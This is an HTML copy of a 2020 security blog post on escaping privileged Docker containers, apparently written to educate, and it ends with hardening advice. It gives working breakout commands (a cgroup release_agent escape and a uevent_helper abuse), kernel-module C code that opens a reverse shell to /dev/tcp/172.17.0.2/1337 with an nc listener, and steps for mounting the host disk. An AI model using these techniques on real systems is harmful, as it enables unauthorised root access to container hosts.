<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Container Breakouts – Part 2: Privileged Container | Nody´s blog</title>
<meta name="keywords" content="docker, breakout, security">
<meta name="description" content="This post is part of a series and shows container breakout techniques that can be performed if a container is started privileged.">
<meta name="author" content="Jan Harrie">
<link rel="canonical" href="//blog.nody.cc/posts/container-breakouts-part2/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.fc220c15db4aef0318bbf30adc45d33d4d7c88deff3238b23eb255afdc472ca6.css" integrity="sha256-/CIMFdtK7wMYu/MK3EXTPU18iN7/MjiyPrJVr9xHLKY=" rel="preload stylesheet" as="style">
<link rel="icon" href="//blog.nody.cc/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="//blog.nody.cc/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="//blog.nody.cc/favicon-32x32.png">
<link rel="apple-touch-icon" href="//blog.nody.cc/apple-touch-icon.png">
<link rel="mask-icon" href="//blog.nody.cc/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="//blog.nody.cc/posts/container-breakouts-part2/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript>
  

<meta property="og:title" content="Container Breakouts – Part 2: Privileged Container" />
<meta property="og:description" content="This post is part of a series and shows container breakout techniques that can be performed if a container is started privileged." />
<meta property="og:type" content="article" />
<meta property="og:url" content="//blog.nody.cc/posts/container-breakouts-part2/" />
<meta property="og:image" content="//blog.nody.cc/images/logo.png" />
<meta property="article:section" content="posts" />
<meta property="article:published_time" content="2020-07-21T15:42:19+02:00" />
<meta property="article:modified_time" content="2020-07-21T15:42:19+02:00" />

<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="//blog.nody.cc/images/logo.png" />
<meta name="twitter:title" content="Container Breakouts – Part 2: Privileged Container"/>
<meta name="twitter:description" content="This post is part of a series and shows container breakout techniques that can be performed if a container is started privileged."/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "//blog.nody.cc/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "Container Breakouts – Part 2: Privileged Container",
      "item": "//blog.nody.cc/posts/container-breakouts-part2/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Container Breakouts – Part 2: Privileged Container",
  "name": "Container Breakouts – Part 2: Privileged Container",
  "description": "This post is part of a series and shows container breakout techniques that can be performed if a container is started privileged.\n",
  "keywords": [
    "docker", "breakout", "security"
  ],
  "articleBody": "This post is part of a series and shows container breakout techniques that can be performed if a container is started privileged.\nThe following posts are part of the series:\nPart 1: Access to root directory of the Host Part 2: Privileged Container Part 3: Docker Socket Intro This is the second post of my container breakout series. After the discussion on how to escape from a system with access only to the root directory, we will now dive into the privileged container. The escalation itself is this time a bit more OpSec-safe then the previous, but still a bit noisy. The proposed techniques are now more container related, then the previous post.\nPrivileged Container If you start a container with Docker and you add the flag --privileged that means to the process in the container can act as root user on the host. The containerization would have the advantage of self-containing software deployment, but no real security boundaries to the kernel when started with that flag.\nThere are multiple ways to escape from a privileged container. Let us have a look…\nCapabilities We will now explore two techniques that can be used to break out of the container. It is important to note here that it is only possible to abuse the capabilities, because there is no seccop filter in place. This is the case if a container is started with --privileged. Docker containers are normally started with a seccomp filter enabled and give an additional layer of security.\nThe available capabilities inside the container can be printed with the command capsh --print. The details about each capability can be taken from the man page (man capabilities). In case of a privileged container, all capabilities are available. An example output looks like following:\n~# capsh --print Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+eip Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read Securebits: 00/0x0/1'b0 secure-noroot: no (unlocked) secure-no-suid-fixup: no (unlocked) secure-keep-caps: no (unlocked) uid=0(root) gid=0(root) groups=0(root) An alternative location to get details about the process capabilities can be taken from /proc/self/status, as following (thanks to Chris le Roy for one of the latest tweets):\nuser@ca719daf3844:~$ grep Cap /proc/self/status CapInh:\t0000003fffffffff CapPrm:\t0000000000000000 CapEff:\t0000000000000000 CapBnd:\t0000003fffffffff CapAmb:\t0000000000000000 user@ca719daf3844:~$ capsh --decode=0000003fffffffff 0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read A detailed summary of sensitive kernel capabilities can be taken from the forum grsecurity post from spender False Boundaries and Arbitrary Code Execution.\nCAP_SYS_ADMIN – cgroup notify on release escape One of the dangerous kernel capabilities is CAP_SYS_ADMIN. If you are acting in a container with this capability, you can manage cgroups of the system. As a short re-cap – cgroups are used to manage the system resources for a container (that’s very brief – I know).\nIn this escape, we use a feature of cgroups that allows the execution of code in the root context, after the last process in a cgroup is terminated. The feature is called “notification on release” and can only be set, because we have the capability CAP_SYS_ADMIN.\nThis technique got popular after Felix Wilhelm from Google Project Zero put the escape in one tweet. Trail of Bits has even investigated further this topic and all details can be read in their blogpost Understanding Docker container escapes.\nHere is just the quintessence of this approach:\nCreate a new cgroup Create and activate “callback” with notify_on_release Create an ephemeral process in new cgroup to trigger “callback” The following commands are necessary to perform the attack:\n~# mkdir /tmp/cgrp \u0026\u0026 mount -t cgroup -o rdma cgroup /tmp/cgrp \u0026\u0026 mkdir /tmp/cgrp/escape_cgroup ~# echo 1 \u003e /tmp/cgrp/escape_cgroup/notify_on_release ~# host_path=`sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab` ~# echo \"$host_path/cmd\" \u003e /tmp/cgrp/release_agent ~# echo '#!/bin/sh' \u003e /cmd ~# echo \"ps aux | /sbin/tee $host_path/cmdout\" \u003e\u003e /cmd ~# chmod a+x /cmd ~# sh -c \"echo 0 \u003e /tmp/cgrp/escape_cgroup/cgroup.procs\" ~# sleep 1 ~# head /cmdout USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND root 1 0.0 0.1 108272 11216 ? Ss 20:57 0:00 /sbin/init root 2 0.0 0.0 0 0 ? S 20:57 0:00 [kthreadd] root 3 0.0 0.0 0 0 ? I\u003c 20:57 0:00 [rcu_gp] root 4 0.0 0.0 0 0 ? I\u003c 20:57 0:00 [rcu_par_gp] root 6 0.0 0.0 0 0 ? I\u003c 20:57 0:00 [kworker/0:0H-kblockd] root 7 0.0 0.0 0 0 ? I 20:57 0:00 [kworker/u8:0-events_power_efficient] root 8 0.0 0.0 0 0 ? I\u003c 20:57 0:00 [mm_percpu_wq] root 9 0.0 0.0 0 0 ? S 20:57 0:00 [ksoftirqd/0] root 10 0.0 0.0 0 0 ? S 20:57 0:00 [rcuc/0] To by honest, this technique was in my setup a bit flaky and I had some issues while repeating it. Do not worry if it is not working on the first try.\nCAP_SYS_Module – Load Kernel Module What do you need to load a kernel module on a Unix host? Exact, the right capability: CAP_SYS_MODULE. In advance, you must be in the same process namespace as the init process, but that is default in case of plain Docker setups. You think now how dare you this is something nobody would do!? That is exactly what happened to Play-with-Docker. I recommend reading the post How I Hacked Play-with-Docker and Remotely Ran Code on the Host by Nimrod Stoler to get all insights and the full picture.\nThe exploitation cannot be that easily weaponized, because we need a kernel module that fits the kernel version. To do so, we need to compile our own kernel module for the host system kerne. I thought initially that’s an easy one, just copy\u0026paste the code, compile and finished. Sounds easy? It is not that easy if you have an Ubuntu container on an Archlinux host – sigh.\nTo perform the steps I had to cheat a bit. Previously, we have performed all steps from inside the container. This time, I will pre-compile the kernel module outside of the container. Why is that necessary in my case? Because I had issues to compile the kernel module for the Archlinux kernel inside an ubuntu container with the Ubuntu toolchain. I am not a kernel developer, so I dropped to dive into the issues and let someone with more expertise to deep-dive on that topic.\nTo prepare the kernel module, you need the kernel headers for the host that runs the container. You can find them while googling through the internet and search for the kernel version headers (kernel version can be identified by uname -r). Afterward, you need the gcc compiler and make and that’s it.\nThe following steps have been performed on a separate host (an ubuntu system).\n~# apt update \u0026\u0026 apt install -y gcc make linux-headers ~# cat \u003c\u003c EOF \u003e reverse-shell.c #include #include MODULE_LICENSE(\"GPL\"); MODULE_AUTHOR(\"AttackDefense\"); MODULE_DESCRIPTION(\"LKM reverse shell module\"); MODULE_VERSION(\"1.0\"); char* argv[] = {\"/bin/bash\",\"-c\",\"bash -i \u003e\u0026 /dev/tcp/172.17.0.2/1337 0\u003e\u00261\", NULL}; static char* envp[] = {\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\", NULL }; static int __init reverse_shell_init(void) { return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC); } static void __exit reverse_shell_exit(void) { printk(KERN_INFO \"Exiting\\n\"); } module_init(reverse_shell_init); module_exit(reverse_shell_exit); EOF ~# cat Makefile obj-m +=reverse-shell.o all: make -C /lib/modules/$(uname -r)/build M=$(pwd) modules clean: make -C /lib/modules/$(uname -r)/build M=$(pwd) clean ~# make After the kernel module is prepared, the binary is transferred to the privileged container. This can be Base64-encoded (in my case 86 lines) or another transfer technique. With the binary transferred into the container, we can start in the listener for the reverse shell.\nTerminal 1\n~# nc -lvlp 1337 listening on [any] 1337 ... Terminal 1 must be on a system that is accessible from the host, that serves the container. The listener can even be started inside the container. If the listener is ready, the kernel module can be loaded, and the host will initiate the reverse shell.\nTerminal 2\n~# insmod reverse-shell.ko And that’s it!\nTerminal 1\n~# nc -lvlp 1337 listening on [any] 1337 ... 172.17.0.1: inverse host lookup failed: Unknown host connect to [172.17.0.2] from (UNKNOWN) [172.17.0.1] 55010 bash: cannot set terminal process group (-1): Inappropriate ioctl for device bash: no job control in this shell root@linux-box:/# A more detailed explanation can be found here Docker Container Breakout: Abusing SYS_MODULE capability! by Nishant Sharma.\nLinux kernel Filesystem /sys The Linux kernel offers access over the filesystem /sys direct access to the kernel. In case you are root – what we are in a privileged container – you can trigger events that got consumed and processed by the kernel. One of the interfaces is the uevent_helper which is a callback that is triggered as soon a new device is plugged in the system. The plugin a new device can be simulated as well by the /sys filesystem.\nAn example to execute commands on the host system is as follows:\nCreate “callback” Link “callback” Trigger “callback” ~# host_path=`sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab` ~# cat \u003c\u003c EOF \u003e /trigger.sh #!/bin/sh ps auxf \u003e $host_path/output.txt EOF ~# chmod +x /trigger.sh ~# echo $host_path/trigger.sh \u003e /sys/kernel/uevent_helper ~# echo change \u003e /sys/class/mem/null/uevent ~# head /output.txt USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND root 2 0.0 0.0 0 0 ? S 14:14 0:00 [kthreadd] root 3 0.0 0.0 0 0 ? I 14:14 0:00 \\_ [kworker/0:0] root 4 0.0 0.0 0 0 ? I\u003c 14:14 0:00 \\_ [kworker/0:0H] root 5 0.0 0.0 0 0 ? I 14:14 0:00 \\_ [kworker/u4:0] root 6 0.0 0.0 0 0 ? I\u003c 14:14 0:00 \\_ [mm_percpu_wq] root 7 0.0 0.0 0 0 ? S 14:14 0:00 \\_ [ksoftirqd/0] root 8 0.0 0.0 0 0 ? I 14:14 0:00 \\_ [rcu_sched] root 9 0.0 0.0 0 0 ? I 14:14 0:00 \\_ [rcu_bh] root 10 0.0 0.0 0 0 ? S 14:14 0:00 \\_ [migration/0] As you can see, the script is executed and the output made available inside the container.\nRemark: Thanks to Matthias for the review and remembering me to add this breakout technique!\nHost Devices If you are in a privileged container, the devices are not striped and namespaced. A quick directory listing of the devices in the container shows that we have access to all of them. Since we are root and have all capabilities, we can mount the devices that are plugged into the host – as well as the hard drive.\nMounting the hard drive is giving us access to the host filesystem.\nroot@0462216e684b:~# ls -l /dev/ [...] brw-rw---- 1 root 994 8, 0 Jul 11 09:20 sda brw-rw---- 1 root 994 8, 1 Jul 11 09:20 sda1 [...] ~# mkdir /hostfs ~# mount /dev/sda1 /hostfs ~# ls -l /hostfs/ total 132 lrwxrwxrwx 1 root root 7 Nov 19 2019 bin -\u003e usr/bin drwxr-xr-x 4 root root 4096 May 13 13:29 boot [...] drwxr-xr-x 104 root root 12288 Jul 11 10:09 etc drwxr-xr-x 4 root root 4096 Jun 30 14:47 home [...] drwxr-x--- 9 root root 4096 Jul 11 10:09 root [...] lrwxrwxrwx 1 root root 7 Nov 19 2019 sbin -\u003e usr/bin [...] drwxr-xr-x 10 root root 4096 May 26 14:37 usr [...] Escalating the access to the root directory of the host is already described in the previous part of the series Part 1: Access to root directory of the Host.\nConclusion We have seen three approaches that can be used if a Unix container is started with an insecure configuration.\nThe main take away message is that one should be careful if a container must be started in privileged mode. Ether it is one of the management components that are needed for controlling the container host system or a malicious agenda. Never start a container privileged if it is not necessary and review carefully the additional capabilities that a container might require.\nNow you know why we discussed the breakout techniques with access to the root directory, before I discussed the access to the host devices.\nIf you are interested in how to use the Docker socket to get out of the container, continue with the next post Part 3: Docker Socket.\n",
  "wordCount" : "1957",
  "inLanguage": "en",
  "image": "//blog.nody.cc/images/logo.png","datePublished": "2020-07-21T15:42:19+02:00",
  "dateModified": "2020-07-21T15:42:19+02:00",
  "author":{
    "@type": "Person",
    "name": "Jan Harrie"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "//blog.nody.cc/posts/container-breakouts-part2/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Nody´s blog",
    "logo": {
      "@type": "ImageObject",
      "url": "//blog.nody.cc/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="//blog.nody.cc/" accesskey="h" title="Nody´s blog (Alt + H)">Nody´s blog</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="//blog.nody.cc/about/" title="About">
                    <span>About</span>
                </a>
            </li>
            <li>
                <a href="//blog.nody.cc/tags/" title="Tags">
                    <span>Tags</span>
                </a>
            </li>
            <li>
                <a href="//blog.nody.cc/posts/" title="Archive">
                    <span>Archive</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      Container Breakouts – Part 2: Privileged Container
    </h1>
    <div class="post-meta"><span title='2020-07-21 15:42:19 +0200 CEST'>July 21, 2020</span>&nbsp;·&nbsp;Jan Harrie

</div>
  </header> 
  <div class="post-content"><p>This post is part of a series and shows container breakout techniques that can be performed if a container is started privileged.</p>
<p>The following posts are part of the series:</p>
<ul>
<li><a href="../container-breakouts-part1">Part 1: Access to root directory of the Host</a></li>
<li>Part 2: Privileged Container</li>
<li><a href="../container-breakouts-part3">Part 3: Docker Socket</a></li>
</ul>
<h2 id="intro">Intro<a hidden class="anchor" aria-hidden="true" href="#intro">#</a></h2>
<p>This is the second post of my container breakout series. After the discussion on how to escape from a system with access only to the root directory, we will now dive into the privileged container. The escalation itself is this time a bit more OpSec-safe then the previous, but still a bit noisy. The proposed techniques are now more container related, then the previous post.</p>
<h2 id="privileged-container">Privileged Container<a hidden class="anchor" aria-hidden="true" href="#privileged-container">#</a></h2>
<p>If you start a container with Docker and you add the flag <code>--privileged</code> that means to the process in the container can act as root user on the host. The containerization would have the advantage of self-containing software deployment, but <strong>no</strong> real <strong>security boundaries to</strong> the <strong>kernel</strong> when started with that flag.</p>
<p>There are multiple ways to escape from a privileged container. Let us have a look&hellip;</p>
<h3 id="capabilities">Capabilities<a hidden class="anchor" aria-hidden="true" href="#capabilities">#</a></h3>
<p>We will now explore two techniques that can be used to break out of the container. It is important to note here that it is only possible to abuse the <a href="https://man7.org/linux/man-pages/man7/capabilities.7.html">capabilities</a>, because there is no <a href="https://man7.org/linux/man-pages/man2/seccomp.2.html">seccop</a> filter in place. This is the case if a container is started with <code>--privileged</code>. Docker containers are normally started with a seccomp filter enabled and give an additional layer of security.</p>
<p>The available capabilities inside the container can be printed with the command <code>capsh --print</code>. The details about each capability can be taken from the man page (<code>man capabilities</code>). In case of a privileged container, all capabilities are available. An example output looks like following:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>~# capsh --print
</span></span><span style="display:flex;"><span>Current: <span style="color:#f92672">=</span> cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+eip
</span></span><span style="display:flex;"><span>Bounding set <span style="color:#f92672">=</span>cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
</span></span><span style="display:flex;"><span>Securebits: 00/0x0/1<span style="color:#960050;background-color:#1e0010">&#39;</span>b0
</span></span><span style="display:flex;"><span> secure-noroot: no <span style="color:#f92672">(</span>unlocked<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span> secure-no-suid-fixup: no <span style="color:#f92672">(</span>unlocked<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span> secure-keep-caps: no <span style="color:#f92672">(</span>unlocked<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
</span></span></code></pre></div><p>An alternative location to get details about the process capabilities can be taken from <code>/proc/self/status</code>, as following (thanks to <a href="https://twitter.com/brompwnie">Chris le Roy</a> for one of the latest tweets):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@ca719daf3844:~$ grep Cap /proc/self/status
</span></span><span style="display:flex;"><span>CapInh:	0000003fffffffff
</span></span><span style="display:flex;"><span>CapPrm:	<span style="color:#ae81ff">0000000000000000</span>
</span></span><span style="display:flex;"><span>CapEff:	<span style="color:#ae81ff">0000000000000000</span>
</span></span><span style="display:flex;"><span>CapBnd:	0000003fffffffff
</span></span><span style="display:flex;"><span>CapAmb:	<span style="color:#ae81ff">0000000000000000</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>user@ca719daf3844:~$ capsh --decode<span style="color:#f92672">=</span>0000003fffffffff
</span></span><span style="display:flex;"><span>0x0000003fffffffff<span style="color:#f92672">=</span>cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
</span></span></code></pre></div><p>A detailed summary of sensitive kernel capabilities can be taken from the forum <a href="https://grsecurity.net/">grsecurity</a> post from spender <a href="https://forums.grsecurity.net/viewtopic.php?t=2522">False Boundaries and Arbitrary Code Execution</a>.</p>
<h4 id="cap_sys_admin--cgroup-notify-on-release-escape"><code>CAP_SYS_ADMIN</code> – cgroup notify on release escape<a hidden class="anchor" aria-hidden="true" href="#cap_sys_admin--cgroup-notify-on-release-escape">#</a></h4>
<p>One of the dangerous kernel capabilities is <code>CAP_SYS_ADMIN</code>. If you are acting in a container with this capability, you can manage cgroups of the system. As a short re-cap – <a href="https://man7.org/linux/man-pages/man7/cgroups.7.html">cgroups</a> are used to manage the system resources for a container (that’s very brief – I know).</p>
<p>In this escape, we use a <strong>feature of cgroups</strong> that allows the <strong>execution</strong> of code <strong>in</strong> the <strong>root context</strong>, after the last process in a cgroup is terminated. The feature is called <strong>“notification on release”</strong> and can only be set, because we have the capability <code>CAP_SYS_ADMIN</code>.</p>
<p>This technique got popular after <a href="https://twitter.com/_fel1x">Felix Wilhelm</a> from <a href="https://googleprojectzero.blogspot.com/">Google Project Zero</a> put the escape in one tweet. <a href="https://www.trailofbits.com/">Trail of Bits</a> has even investigated further this topic and all details can be read in their blogpost <a href="https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/">Understanding Docker container escapes</a>.</p>
<p>Here is just the quintessence of this approach:</p>
<ol>
<li>Create a new cgroup</li>
<li>Create and activate “callback” with <code>notify_on_release</code></li>
<li>Create an ephemeral process in new cgroup to trigger “callback”</li>
</ol>
<p>The following commands are necessary to perform the attack:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>~# mkdir /tmp/cgrp <span style="color:#f92672">&amp;&amp;</span> mount -t cgroup -o rdma cgroup /tmp/cgrp <span style="color:#f92672">&amp;&amp;</span> mkdir /tmp/cgrp/escape_cgroup
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>~# echo <span style="color:#ae81ff">1</span> &gt; /tmp/cgrp/escape_cgroup/notify_on_release
</span></span><span style="display:flex;"><span>~# host_path<span style="color:#f92672">=</span><span style="color:#e6db74">`</span>sed -n <span style="color:#e6db74">&#39;s/.*\perdir=\([^,]*\).*/\1/p&#39;</span> /etc/mtab<span style="color:#e6db74">`</span>
</span></span><span style="display:flex;"><span>~# echo <span style="color:#e6db74">&#34;</span>$host_path<span style="color:#e6db74">/cmd&#34;</span> &gt; /tmp/cgrp/release_agent
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>~# echo <span style="color:#e6db74">&#39;#!/bin/sh&#39;</span> &gt; /cmd
</span></span><span style="display:flex;"><span>~# echo <span style="color:#e6db74">&#34;ps aux | /sbin/tee </span>$host_path<span style="color:#e6db74">/cmdout&#34;</span> &gt;&gt; /cmd
</span></span><span style="display:flex;"><span>~# chmod a+x /cmd
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>~# sh -c <span style="color:#e6db74">&#34;echo 0 &gt; /tmp/cgrp/escape_cgroup/cgroup.procs&#34;</span> 
</span></span><span style="display:flex;"><span>~# sleep <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>~# head /cmdout
</span></span><span style="display:flex;"><span>USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
</span></span><span style="display:flex;"><span>root           <span style="color:#ae81ff">1</span>  0.0  0.1 <span style="color:#ae81ff">108272</span> <span style="color:#ae81ff">11216</span> ?        Ss   20:57   0:00 /sbin/init
</span></span><span style="display:flex;"><span>root           <span style="color:#ae81ff">2</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    20:57   0:00 <span style="color:#f92672">[</span>kthreadd<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root           <span style="color:#ae81ff">3</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   20:57   0:00 <span style="color:#f92672">[</span>rcu_gp<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root           <span style="color:#ae81ff">4</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   20:57   0:00 <span style="color:#f92672">[</span>rcu_par_gp<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root           <span style="color:#ae81ff">6</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   20:57   0:00 <span style="color:#f92672">[</span>kworker/0:0H-kblockd<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root           <span style="color:#ae81ff">7</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I    20:57   0:00 <span style="color:#f92672">[</span>kworker/u8:0-events_power_efficient<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>root           <span style="color:#ae81ff">8</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   20:57   0:00 <span style="color:#f92672">[</span>mm_percpu_wq<span style="color:#f92672">]</span>
